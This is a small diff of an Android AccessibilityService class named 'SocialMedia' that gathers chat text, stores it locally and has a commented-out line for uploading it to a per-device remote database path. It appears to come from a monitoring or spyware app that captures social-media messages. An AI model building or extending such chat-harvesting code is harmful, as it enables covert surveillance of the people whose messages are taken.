@@ -273,7 +273,7 @@ public class SocialMedia extends AccessibilityService {
 
             String result = String.valueOf(str);
 
-            //dbRef.child(aid).child("chats").child(timeStmp()).setValue(Gson().toJson(result));
+            //dbRef.child("Devices").child(aid).child("chats").child(timeStmp()).setValue(Gson().toJson(result));
             pref.setLastSync(timeForComparingLastSync);
             pref.setChat(result);
             str = new StringBuilder();
